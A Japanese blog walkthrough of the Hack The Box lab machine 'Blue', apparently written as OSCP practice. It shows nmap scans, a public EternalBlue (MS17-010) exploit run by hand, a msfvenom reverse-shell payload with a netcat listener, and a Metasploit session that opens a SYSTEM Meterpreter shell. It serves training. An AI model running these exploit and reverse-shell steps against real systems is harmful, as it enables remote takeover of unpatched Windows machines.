# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。
主に記録用として記しています。
現在のランクはHackerです。
間違っていることも多いかと思いますが、よろしくお願いします。
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
チートシートも公開しておりますが知識がまだまだ不足しているため、学習経過とともに身につけた内容などを随時更新していきます。
GitHub(ペネトレーションテスト用チートシート):
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# Blue
EternalBlueはmetasploitを使用すると、一瞬で攻略できてしまうため、OSCP取得を意識してmetasploitなしで攻略します。   
最後におまけとしてmetasploitでの攻略についても記載します。  

HackTheBox公式より
![Blue.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6e2c2ab8-4ab8-357d-73f7-8c596622b14b.png)

Blue, while possibly the most simple machine on Hack The Box, demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly.

Blueは、おそらくHack The Box上で最も単純なマシンであると思われますが、EternalBlueの脆弱性の深刻さを示しており、公開されてから複数の大規模なランサムウェアや暗号マイニング攻撃で使用されています。

# スキャン
Blue(10.10.10.40)に対して、スキャンを行います。  
まずnmapからスキャンを開始します。  
## nmap 

```
nmap -sC -sV -Pn -oN blue.nmap 10.10.10.40
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
# Nmap 7.80 scan initiated Mon Jun 15 15:56:40 2020 as: nmap -sC -sV -Pn -oN blue.nmap 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.25s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -17m09s, deviation: 34m36s, median: 2m48s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-15T08:01:07+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-15T07:01:08
|_  start_date: 2020-06-15T06:59:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 15:58:28 2020 -- 1 IP address (1 host up) scanned in 107.91 seconds
```

スキャン結果から139,445ポートが空いていることが分かるので、代表的な脆弱性が存在していないかnmapのvulnスクリプトを利用して、脆弱性スキャンを行います。
チートシート:
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet#nmap

```
nmap -script smb-vuln* -p 139,445 10.10.10.40
```

```
┌─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $nmap -script smb-vuln* -p 139,445 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:59 JST
Nmap scan report for 10.10.10.40
Host is up (0.25s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 17.23 seconds
```
ms17-010がVULNERABLEとなっています。
この脆弱性はかなり有名なものでEternalBlueと呼ばれているものです。
WannaCryというランサムウェアの拡散などに用いられた脆弱性攻撃です。 
# 侵入
まずはmetasploitなしで攻略しましょう。 
エクスプロイトに必要なものを落としてきます。  
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと出るので先に落としておきましょう。   

```
wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

次にimpacketもインストールしておかないと使うことができないので入れておきましょう。

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

もしもここでpipが入っていないと警告が出た場合は、

```
sudo apt install python-pip
```
をして、pipもインストールしましょう。

次にリバースシェルに使うペイロードをmsfvenomを利用して作成します。

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
```

次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにしましょう。
まずUSERNAMEのところを下記の画像のように変更します。

![スクリーンショット 2020-06-15 17.04.43.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/375fcd67-ae03-1b86-3641-9ba2fc3ec5d0.png)

次にsmb_pwn関数内のスクリプトを下記の画像のように変更します。

![スクリーンショット 2020-06-15 17.06.47.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/2ff690c1-adf5-20a0-5d7c-066e6ebd711b.png)

これで準備は完了です。
通信を受けるためにnetcatで待ち受けておきましょう。

```
nc -lvp 1234
```

最後にeternalblue.pyを実行します。

```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
すると、通信を待ち受けていたnetcatの方でシェルが取得できます。

![スクリーンショット 2020-06-15 17.01.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/88c8a374-bd9e-5b18-36d6-f0c6b3f048ca.png)

権限はnt authority\systemとなっているのでこれで終了です。
お疲れ様でした。


# おまけ
metasploitを使ってMS17-010 EternalBlueを攻略してみます。


```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.11
LHOST => 10.10.14.11
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.40:49158) at 2020-06-15 16:03:08 +0900

[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

非常に簡単に攻略することができました。